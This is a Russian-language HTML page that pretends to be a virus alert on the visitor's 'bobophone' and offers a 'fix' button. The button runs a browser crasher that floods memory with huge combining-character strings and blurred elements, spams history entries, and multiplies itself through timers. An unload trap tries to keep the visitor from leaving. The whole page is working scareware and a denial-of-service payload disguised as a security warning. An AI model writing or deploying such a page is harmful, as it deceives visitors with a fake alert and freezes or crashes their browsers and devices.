<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚠️ бобофон угроза ⚠️</title>
    <style>
        body {
            background: #000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            margin: 0;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            flex-direction: column;
        }
        #ui { text-align: center; z-index: 9999; }
        .btn {
            border: 2px solid red;
            padding: 20px 40px;
            background: none;
            color: red;
            font-size: 24px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            text-transform: uppercase;
        }
        .noise {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none;
            opacity: 0.1;
            z-index: 1;
            filter: url(#f);
        }
    </style>
</head>
<body>

    <svg xmlns="http://w3.org" style="display:none">
        <filter id="f">
            <feTurbulence baseFrequency="0.01" numOctaves="500" />
        </filter>
    </svg>
    <div class="noise"></div>

    <div id="ui">
        <h1 id="status">На вашем бобофоне найден вирус!🦉🦉🦉</h1>
        <p>Система безопасности обнаружила угрозу. Требуется подтверждение.</p>
        <button class="btn" onclick="goLutyi()">ОК / ИСПРАВИТЬ</button>
    </div>

<script>
    let memory = [];

        function goLutyi() {
        document.documentElement.requestFullscreen?.();
        document.getElementById('ui').innerHTML = '<h1 style="font-size:60px">FATAL ERROR</h1>';
        function flood() {
            let crash = new Array(1000000).join("ก้้้้้้้้้้้้้้้้");

            for (let i = 0; i < 200; i++) {
                let d = document.createElement('div');
                d.innerHTML = crash;
                d.style.filter = "blur(100px) contrast(200%)";
                document.body.appendChild(d);
            }

            for (let j = 0; j < 500; j++) {
                history.pushState(null, null, "#" + Math.random());
            }

            setTimeout(flood, 1);
            setTimeout(flood, 1);
        }
        flood();
    }

    window.onbeforeunload = function() { return "Данные будут потеряны!"; };
</script>
</body>
</html>
